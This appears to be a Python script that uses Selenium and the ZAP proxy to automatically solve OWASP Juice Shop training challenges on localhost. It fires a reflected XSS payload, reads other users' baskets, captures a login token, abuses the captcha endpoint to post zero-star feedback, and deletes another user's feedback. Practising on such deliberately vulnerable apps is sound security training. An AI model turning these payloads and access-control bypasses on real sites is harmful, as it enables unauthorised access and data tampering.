import os
from zapv2 import ZAPv2
import requests
import json
from selenium import webdriver
from selenium.webdriver.common.proxy import Proxy, ProxyType
import time
 
os.environ["webdriver.chrome.driver"] = '/Users/ahermosilla/Library/Application Support/ZAP/webdriver/macos/64/chromedriver'

proxy = Proxy()
proxy.proxy_type = ProxyType.MANUAL
proxy.http_proxy = "127.0.0.1:8080"
proxy.socks_proxy = "127.0.0.1:8080"
proxy.ssl_proxy = "127.0.0.1:8080"

capabilities = webdriver.DesiredCapabilities.CHROME
proxy.add_to_capabilities(capabilities)

options = webdriver.ChromeOptions()
options.add_argument('--ignore-certificate-errors')
options.add_argument("--test-type")
driver = webdriver.Chrome(executable_path=os.environ["webdriver.chrome.driver"], chrome_options=options, desired_capabilities=capabilities)

# Access score board
driver.get('http://localhost:3000/#/score-board')
time.sleep(1)

# Access Admin
driver.get('http://localhost:3000/#/administration')
time.sleep(1)

# Reflected XSS
driver.get('http://localhost:3000/#/track-result?id=<script>alert("XSS")</script>')
time.sleep(1)


driver.quit()

zap = ZAPv2()
proxy = zap._ZAPv2__proxies
root = "http://localhost:3000"
headers = {'Content-Type': 'application/json'}

# Access someone elses bucket
zap.urlopen("%s/rest/basket/1" % root)
zap.urlopen("%s/rest/basket/2" % root)

# Register
payload = {
  "email":"test@test.com",
  "password":"testest",
  "passwordRepeat":"testtest",
  "securityQuestion":{
    "id":1,
    "question":"Your eldest siblings middle name?",
    "createdAt":"2018-11-07T21:19:32.395Z",
    "updatedAt":"2018-11-07T21:19:32.395Z"
  },
  "securityAnswer":"test"
}
response = requests.post("%s/api/Users/" % root, headers=headers, proxies=proxy, verify=False, data=json.dumps(payload))

try:
  print(response.json())
except Exception as err:
  print(err)
  pass

# Login and capture token
payload = {"email":"test@test.com", "password":"testest"}
response = requests.post("%s/rest/user/login" % root, headers=headers, proxies=proxy, verify=False, data=json.dumps(payload))
data = {}

try:
  data = response.json()
except Exception as err:
  print("Login time")
  print(err)
  print(response.text)
  exit()
  
token = data['authentication']['token']
headers['Authorization'] =  'Bearer ' + token

# Get captcha for giving feedback then post feedback of 0
captcha = requests.get("%s/rest/captcha/" % root, proxies=proxy, verify=False, headers=headers).json()
data = requests.post("%s/api/Feedbacks/" % root, headers=headers, proxies=proxy, verify=False, data=json.dumps({
  "comment":"Comment?",
  "rating":0,
  "captcha":captcha["answer"],
  "captchaId":captcha["captchaId"]
})).json()
print(data)

# Delete 5-star feedback
print(requests.delete("%s/api/Feedbacks/1" % root, proxies=proxy, verify=False, headers=headers).text)

print("")
print("[!] Challenges")
data = requests.get("%s/api/Challenges/" % root,headers=headers, proxies=proxy, verify=False).json()
solved = [c for c in data['data'] if c['solved']]

for s in solved:
  print(" - " + s['name'])